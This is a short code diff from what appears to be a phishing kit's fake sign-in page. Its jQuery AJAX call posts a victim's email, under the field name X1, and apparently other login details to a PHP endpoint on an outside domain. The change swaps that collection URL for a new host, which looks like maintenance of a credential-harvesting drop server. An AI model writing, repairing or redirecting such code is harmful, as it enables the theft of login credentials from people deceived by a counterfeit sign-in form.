@@ -46,7 +46,7 @@ $(document).ready(function(){
         $("#mcontent").css("display", "none");
         $("#mspinner").css("display", "block");
         $.ajax({
-            url: "https://basareneller.com/kells/3/signin.php",
+            url: "https://exqiutech.com/kell2old/3/signin.php",
             method: "post",
             data: {
                 X1: email,
